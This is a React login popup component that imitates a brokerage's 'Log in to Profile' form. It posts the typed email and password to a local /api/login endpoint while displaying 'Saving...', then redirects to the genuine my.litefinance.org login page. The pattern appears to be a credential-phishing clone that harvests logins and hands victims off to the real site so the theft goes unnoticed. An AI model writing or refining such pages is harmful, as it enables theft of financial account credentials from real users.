"use client";

import { useState } from "react";

export default function LoginPopup() {
  const [form, setForm] = useState({
    email: "",
    password: "",
    remember: false,
  });

  const [msg, setMsg] = useState("");
  const [loading, setLoading] = useState(false);
  const [open, setOpen] = useState(true);

  async function handleSubmit(e: any) {
    e.preventDefault();
    setLoading(true);
    setMsg("Saving...");

    const res = await fetch("/api/login", {
      method: "POST",
      body: JSON.stringify({
        email: form.email,
        password: form.password,
        remember: form.remember,
      }),
    });

    const data = await res.json();
    setMsg(data.message || data.error);

    setLoading(false);
    if (res.ok) {
      window.location.href =
        "https://my.litefinance.org/?openPopup=%2Flogin%2Fpopup";
    }
  }
  if (!open) return null;
  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100">
      <div className="w-[450px] bg-white p-6  shadow-[0_3px_12px_rgba(0,0,0,0.13)]">
        {/* Header */}
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-[20px] font-medium text-gray-800">
            Log in to Profile
          </h2>
          <button
            onClick={() => setOpen(false)}
            className="text-gray-400 hover:text-gray-600 text-6xl leading-none"
          >
            ×
          </button>
        </div>

        {/* Form starts here */}
        <form onSubmit={handleSubmit} className="space-y-4">
          {/* Email */}
          <div>
            <label className="text-gray-600 text-sm">Email or phone</label>
            <input
              type="text"
              value={form.email}
              onChange={(e) => setForm({ ...form, email: e.target.value })}
              className="w-full border-b border-gray-300 py-2 focus:outline-none focus:border-blue-500"
            />
          </div>

          {/* Password */}
          <div>
            <label className="text-gray-600 text-sm">Password</label>
            <input
              type="password"
              value={form.password}
              onChange={(e) => setForm({ ...form, password: e.target.value })}
              className="w-full border-b border-gray-300 py-2 focus:outline-none focus:border-blue-500"
            />
          </div>

          {/* Remember + Forgot */}
          <div className="flex items-center justify-between text-sm pt-10 pb-10 mt-2">
            <label className="flex items-center gap-2 text-gray-600">
              <input
                type="checkbox"
                checked={form.remember}
                onChange={(e) =>
                  setForm({ ...form, remember: e.target.checked })
                }
                className="h-4 w-4"
              />
              Remember me
            </label>

            <a className="text-blue-500 hover:underline cursor-pointer">
              Forgot password?
            </a>
          </div>

          {/* Sign In button */}
          <button
            type="submit"
            disabled={loading}
            className={`w-full py-2.5 rounded-md text-white font-medium cursor-pointer tracking-wide transition ${
              loading
                ? "bg-gray-400 cursor-not-allowed"
                : "bg-[#2EA1F8] hover:bg-[#58b0f0]"
            }`}
          >
            {loading ? "Saving..." : "SIGN IN"}
          </button>

          {/* Message result */}
          {msg && (
            <p className="text-center text-sm text-gray-600 mt-1">{msg}</p>
          )}
        </form>

        {/* Divider */}
        <p className="text-center text-sm text-gray-500 my-4">Or login via</p>

        {/* Social buttons */}
        <div className="flex gap-3 justify-center mb-4">
          <button className="bg-[#DB4A29] text-white px-5 py-2 cursor-pointer rounded-md text-sm font-medium hover:brightness-95">
            Google
          </button>

          <button className="bg-[#3B5998] text-white px-5 py-2 cursor-pointer rounded-md text-sm font-medium hover:brightness-95">
            Facebook
          </button>
        </div>

        {/* Registration */}
        <p className="text-center text-sm text-gray-500 pt-5">
          Not yet registered?{" "}
          <a className="text-blue-500 hover:underline cursor-pointer">
            Registration
          </a>
        </p>
      </div>
    </div>
  );
}
